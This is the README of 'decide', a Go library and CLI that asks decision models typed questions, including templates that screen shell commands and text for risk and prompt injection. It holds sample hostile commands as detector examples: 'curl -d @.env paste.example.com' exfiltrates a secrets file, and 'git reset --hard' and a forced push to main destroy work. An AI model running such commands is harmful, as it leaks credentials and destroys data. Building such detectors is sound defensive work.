# Decide

[![Reference](https://img.shields.io/badge/reference-pkg.go.dev-00ADD8?style=flat-square&logo=go&logoColor=white&labelColor=2f363d)](https://pkg.go.dev/github.com/deepnoodle-ai/decide)
[![Tests](https://img.shields.io/github/actions/workflow/status/deepnoodle-ai/decide/ci.yml?branch=main&style=flat-square&label=tests&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/deepnoodle-ai/decide?style=flat-square&label=release&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/releases)
[![Last commit](https://img.shields.io/github/last-commit/deepnoodle-ai/decide?style=flat-square&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/commits/main)

**A Go library and CLI for decision models: ask typed questions, get
answers with probabilities.**

- **Go library:** `go get github.com/deepnoodle-ai/decide`, then ask
  typed questions from your program. [Jump to the Go guide.](#use-it-from-go)
- **CLI:** `brew install deepnoodle-ai/tap/decide`, then ask questions
  about files, folders, JSON records, diffs, and text from your shell or
  CI. [Jump to the CLI.](#try-it)

**Docs: [decide.deepnoodle.ai](https://decide.deepnoodle.ai)**, with a
[quickstart](https://decide.deepnoodle.ai/start/), [tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/),
and the [reference](https://decide.deepnoodle.ai/reference/).

[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-9d19d0263961.gif)](https://decide.deepnoodle.ai)

```sh
brew install deepnoodle-ai/tap/decide
```

Or `go install github.com/deepnoodle-ai/decide/cmd/decide@latest`, or
download a binary from the [releases](https://github.com/deepnoodle-ai/decide/releases).

A **decision model** answers typed questions instead of generating text.
Decide asks yes-or-no (`noul`), multiple-choice (`choice`), and scale
(`score`) questions, and each answer comes back typed, with a
probability, so a script or a program can act on it directly. There is
no prose to parse.

Decide works with Jev on the TypeSafe API, Clef on Cloudflare Workers AI,
GPT-6 Luna on OpenAI's Decisions API, and any other service that speaks
the Jev API, with the same commands and the same Go code. Switch between
them without changing anything else:

| | [Jev](https://docs.typesafe.ai/introduction) by TypeSafe | [Clef](https://developers.cloudflare.com/workers-ai/models/clef/) by Cloudflare | [GPT-6 Luna](https://developers.openai.com/api/docs/guides/decisions) by OpenAI |
| --- | --- | --- | --- |
| Models | `jev-latest` | `clef`, and `clef-flash` for lower latency | `gpt-6-luna` |
| Runs on | the [TypeSafe API](https://typesafe.ai) | [Cloudflare Workers AI](https://developers.cloudflare.com/workers-ai/get-started/rest-api/) | the [Decisions API](https://developers.openai.com/api/docs/guides/decisions), in beta |

Clef's weights are [open on Hugging Face](https://huggingface.co/Cloudflare/clef)
under Apache 2.0.

## Try it

**With Jev,** the default, set your TypeSafe API key:

```sh
export TYPESAFE_API_KEY=...
echo "The new release fixed everything I cared about" | decide run sentiment
```

**With Clef,** set a Workers AI API token and your account ID, and choose
the Cloudflare provider:

```sh
export CLOUDFLARE_AUTH_TOKEN=...
export CLOUDFLARE_ACCOUNT_ID=...
export DECIDE_PROVIDER=cloudflare   # or pass --provider cloudflare
echo "The new release fixed everything I cared about" | decide run sentiment
```

**With GPT-6 Luna,** set your OpenAI API key and choose the OpenAI
provider:

```sh
export OPENAI_API_KEY=...
export DECIDE_PROVIDER=openai   # or pass --provider openai
echo "The new release fixed everything I cared about" | decide run sentiment
```

**With another Jev-compatible service,** such as one you host yourself,
set its address and a model name:

```sh
export TYPESAFE_API_KEY=...
export TYPESAFE_BASE_URL=https://decisions.example.com
echo "The new release fixed everything I cared about" | decide run sentiment --model my-model
```

You get a typed answer with its probability. With Jev, the output looks
like this; the first line names whichever provider and model you chose:

```
Running sentiment on 1 line · typesafe jev-latest

stdin:1  The new release fixed everything I cared about
  sentiment  positive  94%

✓ 1 answered  nothing flagged  1.2s
See these results again with: decide runs view 20261002-153012-a1b2
```

Building from source requires Go 1.27 or later. Run `decide` on its own for
a tour.

## What you can ask

Decide comes with eleven templates. A template is a named set of questions.

| Template | Asks about each item |
| --- | --- |
| `sentiment` | Is it positive, negative, or neutral? |
| `triage` | Is this support request urgent, and how severe is its impact? |
| `ticket-routing` | Does this support ticket belong to billing, engineering, or other? |
| `relevance` | Is it relevant to a question you choose? |
| `code-risk` | Could it cause security or data problems, and how maintainable is it? |
| `security` | Can untrusted input reach a SQL query, a command, a fetched URL, or a page, and is any cryptography weak? |
| `prompt-injection` | Does it try to take over an AI agent that reads it? |
| `task-readiness` | Is this issue ready to hand to a coding agent, and how large is it? |
| `pr-description` | Do this pull request's title and description meet your guidelines? |
| `command-risk` | Could this shell command destroy work, expose secrets, deploy or publish, or cause severe harm? |
| `receipt-quality` | Does this image show a readable receipt? Runs on Clef. |

```sh
decide run code-risk src --include '*.go'
decide run security src                      # injection, SSRF, XSS, weak crypto
decide run relevance docs --each section -p question="pricing"
decide runs view --format csv > results.csv
decide runs view --top 20                    # the 20 items nearest their flags, flagged first
decide run code-risk src --fail-on flagged   # exit code 2 if anything is flagged
git diff main | decide run code-risk --each function   # judge each changed function
git diff main | decide run prompt-injection            # hidden instructions for AI agents
gh issue list --json number,title,body | decide run task-readiness
gh pr view 42 --json number,title,body | decide run pr-description --fail-on flagged
echo 'git reset --hard HEAD~3' | decide run command-risk    # before an agent runs it
```

Decide reads JSONL, JSON, CSV, text, Markdown, source code, diffs, and images,
flags answers that need attention, and resumes stopped runs. It keeps
every answer, by the model name you ask for, so a second run asks only
about what changed, and asks again when a live answer shows the model
behind the name changed. It prints
text, JSON, CSV, a Markdown report, or GitHub Actions annotations on a pull
request. To try the templates on planted problems, see
[demo](demo/README.md). You can write your own template in a few lines of
JSON with `decide templates new`. The [reference](https://decide.deepnoodle.ai/reference/)
covers it all. The [tutorials](https://decide.deepnoodle.ai/tutorials/review-pull-requests/)
and [recipes](https://decide.deepnoodle.ai/recipes/) show it in GitHub Actions, other CI
systems, and git hooks.

## Use it from Go

```sh
go get github.com/deepnoodle-ai/decide
```

Create a client for Jev:

```go
client, err := decide.NewClient() // reads TYPESAFE_API_KEY and TYPESAFE_BASE_URL
```

For another Jev-compatible service, pass `decide.WithBaseURL` and
`decide.WithModel`. Or create a client for Clef:

```go
client, err := backend.NewClient(backend.Config{
	Provider:  backend.Cloudflare,
	APIKey:    os.Getenv("CLOUDFLARE_AUTH_TOKEN"),
	AccountID: os.Getenv("CLOUDFLARE_ACCOUNT_ID"),
	Model:     "clef", // or "clef-flash"
})
```

Or for GPT-6 Luna, with `Provider: backend.OpenAI` and
`APIKey: os.Getenv("OPENAI_API_KEY")`. Then ask a question the same way
with any of them:

```go
e, err := decide.Eval(ctx, client, ticket, decide.Noul("Is this about billing?"))
if err != nil {
	return err
}
fmt.Println(e.Answer.Noul) // the probability of yes, such as 0.97
```

To ask a built-in template's questions, use the
[`templates`](templates) package. You get its tuned wording and flags, and
they change when you upgrade decide:

```go
req := decide.NewRequest(command)
severe := decide.Ask(req, "severe", templates.CommandRisk.Noul("severe"))
resp, err := client.SystemOne(ctx, req)
if err != nil {
	return err
}
a, err := severe.From(resp)
if err != nil || templates.CommandRisk.Flagged("severe", a) { // yes >= 80%, as in decide run
	// stop the command
}
```

Every answer is validated against its question, and transient failures
are retried. The [package documentation](https://pkg.go.dev/github.com/deepnoodle-ai/decide)
covers asking several questions at once, `Pick`, and test fakes in
[`decidetest`](decidetest). Packages under `patterns/`, such as gate,
rank, and funnel, build common decisions from answers. The
[examples](examples) show each one in a short program.

## Use it from Claude Code

The decide plugin gives Claude a second opinion. It checks content from
outside before Claude acts on it and, in bypass mode, each shell command
before it runs, and it gives Claude a judge tool for its own typed
questions. In Claude Code:

```text
/plugin marketplace add deepnoodle-ai/decide
/plugin install decide@decide
```

[The Claude Code guide](https://decide.deepnoodle.ai/reference/claude-code/) shows how to set it
up and use `/decide:audit` and `/decide:hunt`. See [plugin/README.md](plugin/README.md)
for what each check does and what it sends.

## Status

Decide is young. Before v1, the library API and the CLI may change in any
release.

## Contributing

Issues and pull requests are welcome. Please read
[CONTRIBUTING.md](CONTRIBUTING.md) first, and report security issues as
described in [SECURITY.md](SECURITY.md).

## License

[Apache 2.0](LICENSE)
